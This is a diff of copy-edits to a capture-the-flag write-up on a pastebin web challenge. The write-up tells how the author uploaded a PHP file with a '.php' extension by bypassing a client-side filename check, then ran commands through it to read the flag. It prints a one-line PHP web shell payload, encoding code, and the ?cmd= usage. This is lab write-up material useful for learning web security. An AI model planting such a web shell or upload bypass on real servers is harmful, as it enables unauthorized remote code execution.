@@ -1,30 +1,29 @@
 This was another fun one. When you open the page, there is nothing but a simple
-pastebin and a lot of what looked like javascript and ajax code in the main page.
+Pastebin and a lot of what looked like javascript and Ajax code on the main page.
 
 Passing the information through Burp showed me some information, such as the
 fact the server was using the 1.26.1 httpd server and PHP 8.3.7, so we know that
 most likely there is some kind of PHP backend so my next question was whether there
 was a database service or not.
 
-Looking at the code, I noticed that request is AJAX and submits to itself. See this
+Looking at the code, I noticed that the request is AJAX and submits to itself. See this
 line right here:
 
 xhr.open("POST", "", true);
 
 There is no URL listed, so it will probably be submitted to the current page instead of a
 specific endpoint. There is a bunch of code at the bottom of the page source that just
-reads out something about being AI and appeared to be there as a false lead. I mostly
+reads out something about being AI and appears to be there as a false lead. I mostly
 ignored it because this POST had my attention. My next step was to see how this worked,
-I typed in some data and, for a filename, I just gave it text.txt and hit submit.
+I typed in some data, and for a filename, I just gave it text.txt and hit submit.
 
-Error: Only alphanumeric characters are allowed. So there is some sort of input validation
-but it appeared to be minimal, I did not test this further as I noticed some things at
+Error: Only alphanumeric characters are allowed. So, there is some sort of input validation, but it appears to be minimal. I did not test this further as I noticed some things at
 this point: It's not tracking my uploads with a user account, session, or even a cookie,
-at least from my quick glance, so it probably just takes pasted data and tosses it into
-a file. I created a testfile with some quick characters and watched as it was sent back to
+at least from my quick glance, it probably just takes pasted data and tosses it into
+a file. I created a test with some quick characters and watched as it was sent back to
 the server and that I could open it in the /uploads area of the website.
 
-So I began to craft a php payload that would let me run remote commands and I'm happy with
+So I began to craft a php payload that would let me run remote commands, and I'm happy with
 the code as I was just going to try and bypass any filter by encoding it with the following
 lines:
 
@@ -34,13 +33,13 @@ $payload = '<?php system($_GET["cmd"]); ?>';
 $encoded_payload = base64_encode(gzdeflate($payload));
 echo $encoded_payload;
 
-And after I hit save I realized that this isn't going to work. Sure, the encoding might get
+After I hit save, I realized this wouldn't work. Sure, the encoding might get
 past input sanitization, but the fact I couldn't save this as a file with a ".php" extension,
 the web server will most likely just serve it as plain text instead of executing it for me.
 
-Back to the POST and I began to think that this page probably assumes that any submission
+Back to the POST I began to think that this page probably assumes that any submission
 to this page is from this page, and nothing in the code appeared to validate whether it
-came from this page through a random token or something. So I wrote a small payload
+came from this page through a random token or something. So, I wrote a small payload
 delivery script that I hoped would send the payload with the ".php" extension and bypass
 any filters. It worked, as shown here:
 
@@ -58,7 +57,7 @@ sed s/"/\\"/g
 {"message":"Paste saved successfully"}+ exit 0
 
 As you probably noticed, I am using "-x" to print out everything as I always like to be alerted
-to any errors at all. Now we can go to uploads/payload.php?cmd=COMMAND to start digging up some
+to errors. Now we can go to uploads/payload.php?cmd=COMMAND to start digging up some
 data. You can see the example here where I am getting a uname from my payload after sending it,
 I wanted to display the code execution and the payload usage in one image:
 
@@ -100,6 +99,6 @@ https://uscybercombine-s4-scs.chals.io/uploads/payload.php?cmd=cat%20../cUnJOEKi
 
 The flag was my only output: SIVBGR{v@lidate_s3rver_s1de}
 
-Fun times. This is my third solo CTF, and I'm having a great time with stuff like this. I guess I should add that
-I sent one final command, that was to "rm payload.php" so someone else can have the same amount of fun I had
+Fun times. This is my third solo CTF, and I'm having fun with stuff like this. I guess I should add that
+I sent one final command, which was to "rm payload.php" so someone else could have the same amount of fun I had
 with this challenge.
